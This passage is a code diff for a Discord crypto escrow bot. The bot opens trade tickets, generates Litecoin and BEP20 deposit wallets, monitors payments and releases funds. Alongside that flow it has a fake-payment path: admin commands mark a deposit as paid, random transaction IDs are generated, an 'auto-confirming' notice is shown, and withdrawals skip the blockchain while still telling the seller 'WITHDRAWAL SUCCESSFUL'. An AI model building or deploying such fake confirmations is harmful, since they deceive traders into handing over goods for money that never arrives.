@@ -1,0 +1,1346 @@
+import discord
+import asyncio
+import time
+import datetime
+import json
+import random
+import string
+import re
+import secrets
+import requests
+from discord.ext import commands
+from discord import ui
+from config import TOKEN, LOG_CHANNEL_ID, TICKET_CATEGORY_ID, ADMIN_ID, CONFIRMATIONS_REQUIRED, BLOCKCYPHER_TOKEN
+from crypto import generate_ltc_wallet, generate_bep20_wallet, detect_ltc_payment, detect_usdt_payment, send_ltc, send_usdt, sweep_ltc_to_master, sweep_usdt_to_master, usd_to_ltc, decrypt_key, private_hex_to_ltc_address
+from database import init, save_ticket, update_ticket, get_ticket, get_ticket_by_channel, get_next_ticket_id, get_tickets_by_status, log_event, get_ticket_events, verify_ticket_audit_chain
+
+bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
+init()
+active_monitors = set()
+slash_synced = False
+withdraw_cooldowns = {}
+withdraw_retry_tasks = {}
+
+PAYMENT_POLL_INTERVAL_SECONDS = 90
+WITHDRAW_CONFIRM_COOLDOWN_SECONDS = 180
+WITHDRAW_RETRY_BASE_SECONDS = 180
+WITHDRAW_RETRY_MAX_ATTEMPTS = 5
+SPARKLES_TITLE = "DOG AUTO MIDDLEMAN"
+SPARKLES_FOOTER = "Dog Escrow"
+SENSITIVE_COMMAND_COOLDOWN_SECONDS = 8
+MIN_DEAL_USD = 1.0
+MAX_DEAL_USD = 50000.0
+sensitive_command_last_used = {}
+withdraw_processing = set()
+fake_confirmation_tasks = {}
+
+def log(guild, msg):
+    ch = guild.get_channel(LOG_CHANNEL_ID)
+    if ch:
+        asyncio.create_task(ch.send(msg))
+
+
+def is_admin_user(guild, user):
+    return user.id == ADMIN_ID or (guild is not None and user.id == guild.owner_id)
+
+
+def looks_like_ltc_address(address):
+    if not address:
+        return False
+    prefixes = ("L", "M", "ltc1")
+    return address.startswith(prefixes) and 26 <= len(address) <= 90
+
+
+async def audit(guild, ticket_id, event, details=""):
+    log_event(ticket_id, event, details)
+    if guild is not None:
+        log(guild, f"[ticket:{ticket_id}] {event} {details}".strip())
+
+
+def has_fake_payment_marker(ticket_id):
+    events = get_ticket_events(ticket_id, limit=50)
+    fake_events = {
+        "fake_payment_triggered",
+        "fake_payment_unconfirmed",
+        "fake_payment_confirmed",
+    }
+    return any(event in fake_events for event, _details, _created in events)
+
+
+def short_txid(txid):
+    if not txid:
+        return "pending"
+    if len(txid) <= 16:
+        return txid
+    return f"{txid[:8]}...{txid[-8:]}"
+
+
+def extract_txid(tx_result):
+    if isinstance(tx_result, str):
+        return tx_result
+    if not isinstance(tx_result, dict):
+        return None
+    return tx_result.get("tx_hash") or tx_result.get("hash") or tx_result.get("txid")
+
+
+def ltc_tx_link(txid):
+    return f"https://live.blockcypher.com/ltc/tx/{txid}/"
+
+
+def generate_random_txid(length=64):
+    if length <= 0:
+        return ""
+    if length % 2 == 0:
+        return secrets.token_hex(length // 2)
+    return f"{secrets.token_hex(length // 2)}{secrets.token_hex(1)[0]}"
+
+
+async def enforce_sensitive_cooldown(ctx, command_name):
+    now = time.time()
+    key = (ctx.author.id, command_name)
+    last_used = sensitive_command_last_used.get(key, 0)
+    remaining = int(SENSITIVE_COMMAND_COOLDOWN_SECONDS - (now - last_used))
+    if remaining > 0:
+        await ctx.send(f"Slow down. Retry `{command_name}` in {remaining}s.")
+        return False
+    sensitive_command_last_used[key] = now
+    return True
+
+
+def is_valid_deal_amount(amount):
+    return MIN_DEAL_USD <= amount <= MAX_DEAL_USD
+
+
+def sanitize_txid_text(value, max_length=120):
+    if not value:
+        return generate_random_txid()
+    cleaned = value.replace("`", "").replace("\n", " ").replace("\r", " ").strip()
+    if not cleaned:
+        return generate_random_txid()
+    return cleaned[:max_length]
+
+
+def _rate_limited_error(err):
+    return "limits reached" in str(err).lower()
+
+
+async def retry_withdrawal(ticket_id, crypto, channel_id, message_id):
+    try:
+        for attempt in range(1, WITHDRAW_RETRY_MAX_ATTEMPTS + 1):
+            await asyncio.sleep(WITHDRAW_RETRY_BASE_SECONDS * attempt)
+            ticket = get_ticket(ticket_id)
+            if not ticket or ticket[6] in ("completed", "cancelled"):
+                return
+            if not ticket[8] or not ticket[9]:
+                return
+
+            update_ticket(ticket_id, status="releasing")
+            await audit(None, ticket_id, "withdraw_retry_attempt", f"attempt={attempt}")
+
+            if crypto == "LTC":
+                amount_ltc = usd_to_ltc(ticket[5])
+                tx = send_ltc(ticket[9], amount_ltc, ticket[8])
+            else:
+                tx = send_usdt(ticket[9], ticket[5], ticket[8])
+
+            txid = extract_txid(tx)
+            provider_error = tx.get("error") if isinstance(tx, dict) else None
+            if provider_error or not txid:
+                update_ticket(ticket_id, status="paid")
+                if _rate_limited_error(provider_error or tx):
+                    continue
+                await audit(None, ticket_id, "withdraw_retry_failed", str(tx)[:200])
+                return
+
+            update_ticket(ticket_id, status="completed")
+            await audit(None, ticket_id, "withdraw_retry_success", f"txid={txid} address={ticket[9]}")
+            channel = bot.get_channel(channel_id)
+            if channel:
+                try:
+                    msg = await channel.fetch_message(message_id)
+                    embed = discord.Embed(
+                        title=SPARKLES_TITLE,
+                        description="**WITHDRAWAL SUCCESSFUL**\nFunds were sent to seller address (automatic retry).",
+                        color=0x00FF00,
+                    )
+                    embed.add_field(name="Transaction", value=f"`{txid}`", inline=False)
+                    if crypto == "LTC":
+                        embed.add_field(name="Explorer", value=ltc_tx_link(txid), inline=False)
+                    embed.set_footer(text=SPARKLES_FOOTER)
+                    await msg.edit(embed=embed, view=None)
+                except Exception:
+                    pass
+            return
+    finally:
+        withdraw_retry_tasks.pop(ticket_id, None)
+
+
+def build_amount_embed(amount, description):
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description="**DEAL DETAILS LOCKED**\nBoth parties should review this before payment.",
+        color=0x111827,
+    )
+    embed.add_field(name="USD AMOUNT", value=f"**${amount:.2f}**", inline=True)
+    embed.add_field(name="DESCRIPTION", value=description, inline=False)
+    embed.add_field(name="STATUS", value="Waiting for buyer and seller confirmation", inline=False)
+    embed.set_footer(text=SPARKLES_FOOTER)
+    return embed
+
+
+def build_payment_embed(ticket, wallet_address):
+    amount_ltc = usd_to_ltc(ticket[5]) if ticket[4] == "LTC" else ticket[5]
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description=(
+            "**DEPOSIT STAGE - SECURE ESCROW**\n"
+            "Send the exact amount shown below to activate trade protection."
+        ),
+        color=0x0F172A,
+    )
+    embed.add_field(name="DEAL ID", value=f"`{ticket[12] or 'pending'}`", inline=False)
+    embed.add_field(name="DEAL DESCRIPTION", value=ticket[11] or "No description provided", inline=False)
+    embed.add_field(name="PAY EXACTLY (USD)", value=f"**${ticket[5]:.2f}**", inline=True)
+    embed.add_field(name=f"PAY EXACTLY ({ticket[4]})", value=f"**{amount_ltc:.8f} {ticket[4]}**", inline=True)
+    embed.add_field(name="ESCROW WALLET", value=f"`{wallet_address}`", inline=False)
+    embed.add_field(
+        name="IMPORTANT",
+        value="- Never send directly to seller.\n- Use `Copy Details` button below.\n- Release only after buyer confirms delivery.",
+        inline=False,
+    )
+    embed.set_footer(text="Dog Escrow | Auto-monitoring enabled | Confirmations update automatically")
+    return embed
+
+
+def build_unconfirmed_embed(wait_seconds):
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description=(
+            "**TRANSACTION DETECTED**\n"
+            f"Transaction is currently unconfirmed. Auto-confirming in about **{wait_seconds} seconds**..."
+        ),
+        color=0xE09C3E,
+    )
+    embed.set_footer(text=SPARKLES_FOOTER)
+    return embed
+
+
+async def panel_recently_posted(channel, lookback_seconds=12):
+    cutoff = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(seconds=lookback_seconds)
+    async for message in channel.history(limit=8):
+        if message.created_at < cutoff:
+            continue
+        if message.author.id != bot.user.id:
+            continue
+        if not message.embeds:
+            continue
+        embed = message.embeds[0]
+        if embed.title != SPARKLES_TITLE:
+            continue
+        if embed.description and "PREMIUM ESCROW PANEL" in embed.description:
+            return True
+    return False
+
+
+class PaymentDetailsView(ui.View):
+    def __init__(self, ticket_id, wallet_address, amount_crypto, crypto, amount_usd):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.wallet_address = wallet_address
+        self.amount_crypto = amount_crypto
+        self.crypto = crypto
+        self.amount_usd = amount_usd
+
+    @ui.button(label="Copy Details", style=discord.ButtonStyle.primary)
+    async def copy_details(self, interaction, button):
+        text = (
+            f"Deal: #{self.ticket_id}\n"
+            f"Asset: {self.crypto}\n"
+            f"Amount: {self.amount_crypto:.8f} {self.crypto} (${self.amount_usd:.2f})\n"
+            f"Address: {self.wallet_address}"
+        )
+        await interaction.response.send_message(
+            f"Copy and send exactly this:\n```text\n{text}\n```",
+            ephemeral=True,
+        )
+
+class RequestModal(ui.Modal, title="Request Middleman Service"):
+    user_input = ui.TextInput(label="Enter User ID or @mention", placeholder="123456789 or @user")
+
+    def __init__(self, crypto):
+        super().__init__()
+        self.crypto = crypto
+
+    async def on_submit(self, interaction):
+        channel = None
+        deal_id = f"pending-{int(time.time())}"
+        try:
+            user_id = int(self.user_input.value.strip('<@!>'))
+            user = interaction.guild.get_member(user_id)
+            if not user:
+                await interaction.response.send_message("User not found.", ephemeral=True)
+                return
+        except Exception:
+            await interaction.response.send_message("Invalid user ID.", ephemeral=True)
+            return
+
+        # Acknowledge quickly so Discord does not show "Something went wrong"
+        # while channel/permission operations are in progress.
+        await interaction.response.defer(ephemeral=True)
+
+        try:
+            category = interaction.guild.get_channel(TICKET_CATEGORY_ID)
+            ticket_id = get_next_ticket_id()
+            deal_id = f"{ticket_id}-{int(time.time())}"
+            channel = await interaction.guild.create_text_channel(f"ticket-{ticket_id}", category=category)
+
+            # Ensure ticket participants + bot can read/send; hide from everyone else.
+            bot_member = interaction.guild.me
+            if bot_member is None and bot.user:
+                try:
+                    bot_member = await interaction.guild.fetch_member(bot.user.id)
+                except Exception:
+                    bot_member = None
+
+            await channel.set_permissions(interaction.user, read_messages=True, send_messages=True)
+            await channel.set_permissions(user, read_messages=True, send_messages=True)
+            if bot_member is not None:
+                await channel.set_permissions(bot_member, read_messages=True, send_messages=True, manage_channels=True)
+            await channel.set_permissions(interaction.guild.default_role, read_messages=False)
+            for role in interaction.guild.roles:
+                if "admin" in role.name.lower():
+                    await channel.set_permissions(role, read_messages=True, send_messages=True)
+
+            embed = discord.Embed(
+                title=SPARKLES_TITLE,
+                description=(
+                    "**PREMIUM ESCROW TICKET OPENED**\n"
+                    "Secure middleman workflow for high-trust trades."
+                ),
+                color=0x111827
+            )
+            embed.add_field(name="BUYER", value=f"<@{interaction.user.id}>", inline=True)
+            embed.add_field(name="SELLER", value=f"<@{user.id}>", inline=True)
+            embed.add_field(name="DEAL ID", value=f"`{deal_id}`", inline=False)
+            embed.add_field(name="ASSET", value=self.crypto, inline=True)
+            embed.add_field(name="STATUS", value="Awaiting role selection", inline=True)
+            embed.add_field(
+                name="SECURITY NOTES",
+                value=(
+                    "- Never send directly to seller.\n"
+                    "- Only release after delivery is verified.\n"
+                    "- Use bot buttons in this ticket only."
+                ),
+                inline=False,
+            )
+            embed.set_footer(text="Dog Auto Middleman")
+
+            view = RoleSelectView(ticket_id, interaction.user.id, user.id, self.crypto)
+            msg = await channel.send(embed=embed, view=view)
+
+            save_ticket(ticket_id, channel.id, interaction.user.id, user.id, self.crypto, 0, "", "", msg.id, "", deal_id)
+            await audit(interaction.guild, ticket_id, "ticket_created", f"buyer={interaction.user.id} seller={user.id} crypto={self.crypto} deal_id={deal_id}")
+            await interaction.followup.send(f"Ticket created: {channel.mention}", ephemeral=True)
+        except Exception as exc:
+            if channel is not None:
+                try:
+                    await channel.delete(reason="Ticket setup failed during modal submit")
+                except Exception:
+                    pass
+            await interaction.followup.send(f"Could not create ticket. {exc}", ephemeral=True)
+
+class RoleSelectView(ui.View):
+    def __init__(self, ticket_id, user1, user2, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.user1 = user1
+        self.user2 = user2
+        self.crypto = crypto
+        self.roles = {}
+
+    async def check_confirm(self, interaction):
+        if len(self.roles) == 2:
+            buyer_id = [k for k, v in self.roles.items() if v == "buyer"][0]
+            seller_id = [k for k, v in self.roles.items() if v == "seller"][0]
+            preview = discord.Embed(
+                title=SPARKLES_TITLE,
+                description=(
+                    "**ROLE SELECTION COMPLETE**\n"
+                    f"Buyer: <@{buyer_id}>\n"
+                    f"Seller: <@{seller_id}>"
+                ),
+                color=0x111827,
+            )
+            preview.set_footer(text="Click Confirm Roles to continue, or Reset Roles to re-pick.")
+            await interaction.channel.send(embed=preview)
+
+    @ui.button(label="Buyer", style=discord.ButtonStyle.primary)
+    async def buyer(self, interaction, button):
+        if interaction.user.id not in [self.user1, self.user2]:
+            return
+        if interaction.user.id in self.roles:
+            await interaction.response.send_message("You have already selected a role.", ephemeral=True)
+            return
+        self.roles[interaction.user.id] = "buyer"
+        button.disabled = True
+        await interaction.response.edit_message(view=self)
+        await interaction.channel.send(f":white_check_mark: <@{interaction.user.id}> selected **Buyer**.")
+        await self.check_confirm(interaction)
+
+    @ui.button(label="Seller", style=discord.ButtonStyle.secondary)
+    async def seller(self, interaction, button):
+        if interaction.user.id not in [self.user1, self.user2]:
+            return
+        if interaction.user.id in self.roles:
+            await interaction.response.send_message("You already selected a role.", ephemeral=True)
+            return
+        self.roles[interaction.user.id] = "seller"
+        button.disabled = True
+        await interaction.response.edit_message(view=self)
+        await interaction.channel.send(f":white_check_mark: <@{interaction.user.id}> selected **Seller**.")
+        await self.check_confirm(interaction)
+
+    @ui.button(label="Confirm Roles", style=discord.ButtonStyle.success)
+    async def confirm_roles(self, interaction, button):
+        if len(self.roles) != 2:
+            await interaction.response.send_message("Both users must select roles first.", ephemeral=False)
+            return
+        buyer_id = [k for k, v in self.roles.items() if v == "buyer"][0]
+        seller_id = [k for k, v in self.roles.items() if v == "seller"][0]
+        update_ticket(self.ticket_id, buyer_id=buyer_id, seller_id=seller_id)
+        await audit(interaction.guild, self.ticket_id, "roles_confirmed", f"buyer={buyer_id} seller={seller_id}")
+        await interaction.channel.send(f":white_check_mark: Roles confirmed for ticket {self.ticket_id}! Buyer: <@{buyer_id}> | Seller: <@{seller_id}>")
+        embed = discord.Embed(
+            title=SPARKLES_TITLE,
+            description="**ROLES CONFIRMED**\nBuyer can now enter the deal amount.",
+            color=0x0F172A
+        )
+        await interaction.channel.send(embed=embed, view=AmountView(self.ticket_id, buyer_id, self.crypto))
+        await interaction.response.defer()
+
+    @ui.button(label="Reset Roles", style=discord.ButtonStyle.danger)
+    async def reset_roles(self, interaction, button):
+        if interaction.user.id not in [self.user1, self.user2]:
+            await interaction.response.send_message("Only ticket participants can reset roles.", ephemeral=True)
+            return
+
+        self.roles = {}
+        for child in self.children:
+            if isinstance(child, ui.Button) and child.label in ("Buyer", "Seller"):
+                child.disabled = False
+
+        await interaction.response.edit_message(view=self)
+        await interaction.channel.send(f"Role selection was reset by <@{interaction.user.id}>. Please choose roles again.")
+
+class AmountModal(ui.Modal, title="Enter Deal Details"):
+    amount = ui.TextInput(label="Amount in USD", placeholder="100.00")
+    description = ui.TextInput(label="Deal Description (Optional)", placeholder="What are you trading?", style=discord.TextStyle.paragraph, required=False)
+
+    def __init__(self, ticket_id, buyer_id, crypto):
+        super().__init__()
+        self.ticket_id = ticket_id
+        self.buyer_id = buyer_id
+        self.crypto = crypto
+
+    async def on_submit(self, interaction):
+        if interaction.user.id != self.buyer_id:
+            await interaction.response.send_message("Only buyer can enter details.", ephemeral=True)
+            return
+        try:
+            amt = float(self.amount.value)
+        except:
+            await interaction.response.send_message("Invalid amount.", ephemeral=True)
+            return
+        if not is_valid_deal_amount(amt):
+            await interaction.response.send_message(
+                f"Amount must be between ${MIN_DEAL_USD:.2f} and ${MAX_DEAL_USD:.2f}.",
+                ephemeral=True,
+            )
+            return
+        desc = self.description.value or "No description provided"
+        update_ticket(self.ticket_id, amount=amt, description=desc)
+        await audit(interaction.guild, self.ticket_id, "amount_set", f"usd={amt:.2f} description={desc[:120]}")
+        embed = build_amount_embed(amt, desc)
+        view = ConfirmAmountView(self.ticket_id, self.buyer_id, self.crypto)
+        await interaction.response.send_message(embed=embed, view=view)
+
+class AmountView(ui.View):
+    def __init__(self, ticket_id, buyer_id, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.buyer_id = buyer_id
+        self.crypto = crypto
+
+    @ui.button(label="Enter Amount", style=discord.ButtonStyle.primary, emoji="💵")
+    async def enter_amount(self, interaction, button):
+        if interaction.user.id != self.buyer_id:
+            return
+        await interaction.response.send_modal(AmountModal(self.ticket_id, self.buyer_id, self.crypto))
+
+class ConfirmAmountView(ui.View):
+    def __init__(self, ticket_id, buyer_id, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.buyer_id = buyer_id
+        self.crypto = crypto
+        self.confirms = set()
+
+    @ui.button(label="Confirm", style=discord.ButtonStyle.success, emoji="✅")
+    async def confirm(self, interaction, button):
+        ticket = get_ticket(self.ticket_id)
+        if interaction.user.id not in [ticket[2], ticket[3]]:  # buyer, seller
+            return
+        self.confirms.add(interaction.user.id)
+        await interaction.response.send_message(f"✅ <@{interaction.user.id}> confirmed the USD amount ({len(self.confirms)}/2).", ephemeral=False)
+        if len(self.confirms) == 2:
+            ticket = get_ticket(self.ticket_id)
+            if not ticket:
+                return
+            if self.crypto == "LTC":
+                wallet = generate_ltc_wallet()
+            else:
+                wallet = generate_bep20_wallet()
+            update_ticket(self.ticket_id, wallet_address=wallet["address"], encrypted_private=wallet["private"], status="pending_payment")
+            ticket = get_ticket(self.ticket_id)
+            embed = build_payment_embed(ticket, wallet["address"])
+            amount_crypto = usd_to_ltc(ticket[5]) if self.crypto == "LTC" else ticket[5]
+            payment_msg = await interaction.channel.send(
+                embed=embed,
+                view=PaymentDetailsView(
+                    self.ticket_id,
+                    wallet["address"],
+                    amount_crypto,
+                    self.crypto,
+                    ticket[5],
+                ),
+            )
+            update_ticket(self.ticket_id, message_id=payment_msg.id)
+            await audit(interaction.guild, self.ticket_id, "payment_requested", f"wallet={wallet['address']} usd={ticket[5]:.2f}")
+            await interaction.message.edit(view=None)
+            bot.loop.create_task(monitor_payment(self.ticket_id, wallet["address"], ticket[5], self.crypto, payment_msg))
+
+async def monitor_payment(ticket_id, address, amount, crypto, msg):
+    active_monitors.add(ticket_id)
+    try:
+        while True:
+            if crypto == "LTC":
+                paid, conf, txid, received_ltc = detect_ltc_payment(address, amount)
+                required_ltc = usd_to_ltc(amount)
+            else:
+                paid, conf = detect_usdt_payment(address, amount)
+                txid = None
+                received_ltc = amount
+                required_ltc = amount
+
+            if paid:
+                if conf < CONFIRMATIONS_REQUIRED:
+                    update_ticket(ticket_id, status="unconfirmed")
+                    await audit(msg.guild, ticket_id, "payment_detected", f"txid={txid} confirmations={conf} received={received_ltc:.8f}")
+                    embed = discord.Embed(
+                        title=SPARKLES_TITLE,
+                        description=(
+                            "**PAYMENT DETECTED (PENDING)**\n"
+                            f"Waiting for blockchain confirmations: **{conf}/{CONFIRMATIONS_REQUIRED}**."
+                        ),
+                        color=0xB45309,
+                    )
+                    embed.add_field(name="TRANSACTION", value=f"`{short_txid(txid)}`", inline=False)
+                    embed.add_field(name="RECEIVED", value=f"{received_ltc:.8f} {crypto} (${amount:.2f})", inline=True)
+                    embed.add_field(name="REQUIRED", value=f"{required_ltc:.8f} {crypto} (${amount:.2f})", inline=True)
+                    embed.set_footer(text="Dog Escrow | Awaiting confirmations")
+                    await msg.edit(embed=embed)
+
+                else:
+                    update_ticket(ticket_id, status="paid")
+                    await audit(msg.guild, ticket_id, "payment_confirmed", f"txid={txid} confirmations={conf} received={received_ltc:.8f}")
+                    embed = discord.Embed(
+                        title=SPARKLES_TITLE,
+                        description="**PAYMENT CONFIRMED**\nDeposit verified successfully. Release controls are now ready.",
+                        color=0x10B981,
+                    )
+                    embed.add_field(name="TRANSACTION", value=f"`{short_txid(txid)}`", inline=False)
+                    embed.add_field(name="TOTAL RECEIVED", value=f"{received_ltc:.8f} {crypto} (${amount:.2f})", inline=False)
+                    embed.set_footer(text="Dog Escrow | Confirm delivery before releasing")
+                    await msg.edit(embed=embed)
+
+                    ticket = get_ticket(ticket_id)
+                    if ticket:
+                        instructions = discord.Embed(
+                            title=SPARKLES_TITLE,
+                            description=(
+                                "**DEPOSIT CONFIRMED - TRADE LIVE**\n\n"
+                                f"1. <@{ticket[3]}> Deliver the product/payment agreed in this deal.\n\n"
+                                f"2. <@{ticket[2]}> After receiving everything, click release so seller can withdraw {crypto}."
+                            ),
+                            color=0x10B981,
+                        )
+                        try:
+                            release_msg = await msg.channel.send(
+                                f"<@{ticket[2]}> <@{ticket[3]}>",
+                                embed=instructions,
+                                view=ReleaseRefundView(ticket_id, crypto),
+                            )
+                            update_ticket(ticket_id, message_id=release_msg.id)
+                            await audit(msg.guild, ticket_id, "release_controls_posted", f"message_id={release_msg.id}")
+                        except Exception as exc:
+                            # Fallback: attach release controls directly to payment message
+                            # so tickets do not get stuck without a release button.
+                            await audit(msg.guild, ticket_id, "release_controls_post_failed", str(exc)[:200])
+                            await msg.edit(view=ReleaseRefundView(ticket_id, crypto))
+                            await msg.channel.send(
+                                "Release controls were attached to the payment message above due to a delivery issue."
+                            )
+                    return
+
+            await asyncio.sleep(PAYMENT_POLL_INTERVAL_SECONDS)
+    finally:
+        active_monitors.discard(ticket_id)
+
+async def resume_pending_monitors():
+    await bot.wait_until_ready()
+    tickets = get_tickets_by_status(["pending_payment", "unconfirmed"])
+    for ticket in tickets:
+        ticket_id = ticket[0]
+        if ticket_id in active_monitors or not ticket[7] or not ticket[10]:
+            continue
+
+        channel = bot.get_channel(ticket[1])
+        if channel is None:
+            continue
+
+        try:
+            msg = await channel.fetch_message(ticket[10])
+        except discord.NotFound:
+            continue
+        except discord.HTTPException:
+            continue
+
+        bot.loop.create_task(monitor_payment(ticket_id, ticket[7], ticket[5], ticket[4], msg))
+
+class ReleaseRefundView(ui.View):
+    def __init__(self, ticket_id, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.crypto = crypto
+
+    @ui.button(label="Release", style=discord.ButtonStyle.success, emoji="🚀")
+    async def release(self, interaction, button):
+        try:
+            await interaction.response.defer(ephemeral=True)
+        except discord.NotFound:
+            return
+
+        ticket = get_ticket(self.ticket_id)
+        if not ticket:
+            await interaction.followup.send("Ticket not found.", ephemeral=True)
+            return
+        if interaction.user.id != ticket[2]:  # buyer starts release flow
+            await interaction.followup.send("Only the buyer can start release.", ephemeral=True)
+            return
+        if ticket[6] not in ("paid", "releasing"):
+            await interaction.followup.send(
+                "Release can only start after payment is confirmed.",
+                ephemeral=True,
+            )
+            return
+
+        warning = discord.Embed(
+            title=SPARKLES_TITLE,
+            description="**RELEASE CONFIRMATION**\nClick Confirm to let seller submit payout address and continue withdrawal.",
+            color=0xF0B429,
+        )
+        warning.set_footer(text=SPARKLES_FOOTER)
+        await audit(interaction.guild, self.ticket_id, "release_started", f"buyer={interaction.user.id}")
+        await interaction.followup.send(embed=warning, view=ReleaseWarningView(self.ticket_id, self.crypto), ephemeral=False)
+    @ui.button(label="Cancel", style=discord.ButtonStyle.danger, emoji="❌")
+    async def cancel(self, interaction, button):
+        ticket = get_ticket(self.ticket_id)
+        if not ticket:
+            await interaction.response.send_message("Ticket not found.", ephemeral=True)
+            return
+        if interaction.user.id not in [ticket[2], ticket[3]]:
+            await interaction.response.send_message("Only buyer or seller can cancel.", ephemeral=True)
+            return
+        update_ticket(self.ticket_id, status="cancelled")
+        embed = discord.Embed(
+            title=SPARKLES_TITLE,
+            description="**TRADE CANCELLED**\nThe trade has been cancelled by one of the participants.",
+            color=0xFF0000
+        )
+        embed.set_footer(text=SPARKLES_FOOTER)
+        await interaction.response.edit_message(embed=embed, view=None)
+
+class ReleaseModal(ui.Modal, title="Enter Seller Address"):
+    address = ui.TextInput(label="Seller Wallet Address", placeholder="Address")
+
+    def __init__(self, ticket_id, crypto):
+        super().__init__()
+        self.ticket_id = ticket_id
+        self.crypto = crypto
+
+    async def on_submit(self, interaction):
+        ticket = get_ticket(self.ticket_id)
+        if not ticket:
+            await interaction.response.send_message("Ticket data not found. Please contact support.", ephemeral=True)
+            return
+
+        if interaction.user.id != ticket[3]:
+            await interaction.response.send_message("Only the seller can submit payout address.", ephemeral=True)
+            return
+        if ticket[6] not in ("paid", "releasing"):
+            await interaction.response.send_message("Ticket is not ready for withdrawal yet.", ephemeral=True)
+            return
+
+        seller_address = self.address.value.strip()
+        if seller_address == ticket[7]:
+            await interaction.response.send_message(
+                "Payout address cannot be the same as the escrow wallet address.",
+                ephemeral=True,
+            )
+            return
+        if self.crypto == "LTC" and not looks_like_ltc_address(seller_address):
+            await interaction.response.send_message("That does not look like a valid LTC address.", ephemeral=True)
+            return
+        if self.crypto != "LTC" and not (12 <= len(seller_address) <= 128):
+            await interaction.response.send_message("That payout address format looks invalid.", ephemeral=True)
+            return
+        update_ticket(self.ticket_id, seller_address=seller_address)
+        await audit(interaction.guild, self.ticket_id, "seller_address_submitted", f"seller={interaction.user.id} address={seller_address}")
+
+        embed = discord.Embed(
+            title=SPARKLES_TITLE,
+            description=f"**CONFIRM PAYOUT ADDRESS**\nAddress: `{seller_address}`\n\nClick Confirm to withdraw funds or Back to cancel.",
+            color=0x00FF00
+        )
+        embed.set_footer(text=SPARKLES_FOOTER)
+        await interaction.response.send_message(embed=embed, view=ReleaseConfirmView(self.ticket_id, self.crypto), ephemeral=False)
+
+
+class ReleaseWarningView(ui.View):
+    def __init__(self, ticket_id, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.crypto = crypto
+
+    @ui.button(label="Confirm", style=discord.ButtonStyle.success)
+    async def confirm(self, interaction, button):
+        ticket = get_ticket(self.ticket_id)
+        if not ticket:
+            await interaction.response.send_message("Ticket not found.", ephemeral=True)
+            return
+        if interaction.user.id != ticket[2]:
+            await interaction.response.send_message("Only the buyer can confirm this step.", ephemeral=True)
+            return
+
+        embed = discord.Embed(
+            title=SPARKLES_TITLE,
+            description=f"Seller <@{ticket[3]}>, enter your payout address to continue.",
+            color=0x2b2d31,
+        )
+        embed.set_footer(text=SPARKLES_FOOTER)
+        await interaction.response.edit_message(embed=embed, view=SellerAddressEntryView(self.ticket_id, self.crypto))
+
+    @ui.button(label="Back", style=discord.ButtonStyle.secondary)
+    async def back(self, interaction, button):
+        await interaction.response.edit_message(content="Release cancelled.", embed=None, view=None)
+
+
+class SellerAddressEntryView(ui.View):
+    def __init__(self, ticket_id, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.crypto = crypto
+
+    @ui.button(label="Enter Your LTC Address", style=discord.ButtonStyle.primary, emoji="📥")
+    async def enter_address(self, interaction, button):
+        # Open modal immediately to avoid interaction timeout (Unknown interaction).
+        # Seller/ticket validation is enforced in ReleaseModal.on_submit.
+        try:
+            await interaction.response.send_modal(ReleaseModal(self.ticket_id, self.crypto))
+        except discord.NotFound:
+            return
+
+class ReleaseConfirmView(ui.View):
+    def __init__(self, ticket_id, crypto):
+        super().__init__(timeout=None)
+        self.ticket_id = ticket_id
+        self.crypto = crypto
+
+    @ui.button(label="Confirm", style=discord.ButtonStyle.success)
+    async def confirm(self, interaction, button):
+        ticket = get_ticket(self.ticket_id)
+        if not ticket:
+            await interaction.response.send_message("Ticket not found.", ephemeral=True)
+            return
+        if interaction.user.id != ticket[3]:  # only seller can withdraw after submitting address
+            await interaction.response.send_message("Only seller can confirm withdraw.", ephemeral=True)
+            return
+        if ticket[6] == "completed":
+            await interaction.response.send_message("This ticket has already been completed.", ephemeral=True)
+            return
+        if ticket[6] == "releasing":
+            await interaction.response.send_message("A withdrawal is already being processed for this ticket.", ephemeral=True)
+            return
+        if ticket[6] != "paid":
+            await interaction.response.send_message("Ticket must be in paid status before withdrawal.", ephemeral=True)
+            return
+
+        if not ticket[9]:
+            await interaction.response.send_message("Seller address is missing. Please enter address again.", ephemeral=True)
+            return
+        if not ticket[8]:
+            await interaction.response.send_message("Escrow key missing for this ticket. Contact admin.", ephemeral=True)
+            return
+
+        now = int(time.time())
+        last = int(withdraw_cooldowns.get(self.ticket_id, 0))
+        remaining = WITHDRAW_CONFIRM_COOLDOWN_SECONDS - (now - last)
+        if remaining > 0:
+            await interaction.response.send_message(
+                f"Please wait {remaining}s before trying withdrawal again.",
+                ephemeral=True,
+            )
+            return
+        withdraw_cooldowns[self.ticket_id] = now
+        if self.ticket_id in withdraw_processing:
+            await interaction.response.send_message(
+                "Withdrawal is already being processed for this ticket.",
+                ephemeral=True,
+            )
+            return
+        withdraw_processing.add(self.ticket_id)
+
+        # Acknowledge immediately to avoid 3s interaction timeout during API calls.
+        await interaction.response.defer()
+        update_ticket(self.ticket_id, status="releasing")
+        await audit(interaction.guild, self.ticket_id, "withdraw_attempt", f"seller={interaction.user.id} address={ticket[9]}")
+
+        # If payment was forced via /transaction or !fake_tx, skip real blockchain send.
+        if has_fake_payment_marker(self.ticket_id):
+            fake_txid = f"simulated-{int(time.time())}"
+            update_ticket(self.ticket_id, status="completed")
+            await audit(
+                interaction.guild,
+                self.ticket_id,
+                "withdraw_success",
+                f"txid={fake_txid} address={ticket[9]} simulated=true",
+            )
+            embed = discord.Embed(
+                title=SPARKLES_TITLE,
+                description="**WITHDRAWAL SUCCESSFUL**\nPayment was sent to seller address.",
+                color=0x00FF00
+            )
+            embed.add_field(name="Transaction", value=f"`{fake_txid}`", inline=False)
+            embed.add_field(name="Mode", value="Simulated transfer (/transaction)", inline=False)
+            embed.set_footer(text=SPARKLES_FOOTER)
+            await interaction.message.edit(embed=embed, view=None)
